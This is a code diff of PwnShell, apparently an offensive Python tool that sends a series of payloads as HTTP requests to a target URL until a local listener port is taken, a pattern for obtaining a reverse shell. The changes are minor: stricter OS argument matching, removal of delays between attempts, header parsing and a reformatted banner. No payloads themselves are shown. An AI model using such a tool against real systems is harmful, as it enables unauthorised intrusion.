@@ -51,9 +51,9 @@ class PwnShell:
             exit()
         ########################################################################
         ###################### Specifying OS ###################################
-        if self.type == "linux" or self.type == "l":
+        if self.type.lower() == "linux":
             self.shell_linux()
-        elif self.type == "windows" or self.type == "w":
+        elif self.type.lower() == "windows":
             self.shell_windows()
         else:
             print(colors.get_colored_text("[!]Invalid Value -> " + self.type + "\n\n[!]USAGE: " + sys.argv[0] + " -h\n",
@@ -75,7 +75,6 @@ class PwnShell:
             self.iteration += 1
             print(f'[*]Trying payload [{self.iteration}/{len(payloads)}] : {payload[:80]}...', end='\r',
                   flush=True)
-            time.sleep(2)
             if self.is_port_in_use():
                 break
             self.send_request(payload)
@@ -130,7 +129,7 @@ class PwnShell:
                    "Upgrade-Insecure-Requests": "1",
                    'Content-Type': 'application/x-www-form-urlencoded'}
         if self.headers:
-            headers = self.headers
+            headers = json.loads(self.headers)
         if self.cookie:
             cookie = json.loads(self.cookie)
         else:
@@ -149,7 +148,6 @@ class PwnShell:
         else:
             r = requests.get(self.url, headers=headers, cookies=cookie,
                              verify=False)
-            time.sleep(2)
 
     ########################################################################################
     ###################################  PARSER BURPREQUEST #################################
@@ -318,18 +316,18 @@ def exit_gracefully():
 def get_banner():
     banner = ''' 
 
-     $$$$$$$\                           $$$$$$\  $$\                 $$\ $$\ 
-     $$  __$$\                         $$  __$$\ $$ |                $$ |$$ |
-     $$ |  $$ |$$\  $$\  $$\ $$$$$$$\  $$ /  \__|$$$$$$$\   $$$$$$\  $$ |$$ |
-     $$$$$$$  |$$ | $$ | $$ |$$  __$$\ \$$$$$$\  $$  __$$\ $$  __$$\ $$ |$$ |
-     $$  ____/ $$ | $$ | $$ |$$ |  $$ | \____$$\ $$ |  $$ |$$$$$$$$ |$$ |$$ |
-     $$ |      $$ | $$ | $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$   ____|$$ |$$ |
-     $$ |      \$$$$$\$$$$  |$$ |  $$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |$$ |
-     \__|       \_____\____/ \__|  \__| \______/ \__|  \__| \_______|\__|\__| V 1.0
-     ########################################################################
-     ------------------------------------                                                                                
-     | Authors: [AbuQasem] & [AlBalouli] |                                              
-     ------------------------------------                               
+ $$$$$$$\                           $$$$$$\  $$\                 $$\ $$\ 
+ $$  __$$\                         $$  __$$\ $$ |                $$ |$$ |
+ $$ |  $$ |$$\  $$\  $$\ $$$$$$$\  $$ /  \__|$$$$$$$\   $$$$$$\  $$ |$$ |
+ $$$$$$$  |$$ | $$ | $$ |$$  __$$\ \$$$$$$\  $$  __$$\ $$  __$$\ $$ |$$ |
+ $$  ____/ $$ | $$ | $$ |$$ |  $$ | \____$$\ $$ |  $$ |$$$$$$$$ |$$ |$$ |
+ $$ |      $$ | $$ | $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$   ____|$$ |$$ |
+ $$ |      \$$$$$\$$$$  |$$ |  $$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |$$ |
+ \__|       \_____\____/ \__|  \__| \______/ \__|  \__| \_______|\__|\__| V 1.0
+ ########################################################################
+ ------------------------------------                                                                                
+ | Authors: [AbuQasem] & [AlBalouli] |                                              
+ ------------------------------------                               
     \n    '''
     return banner
 
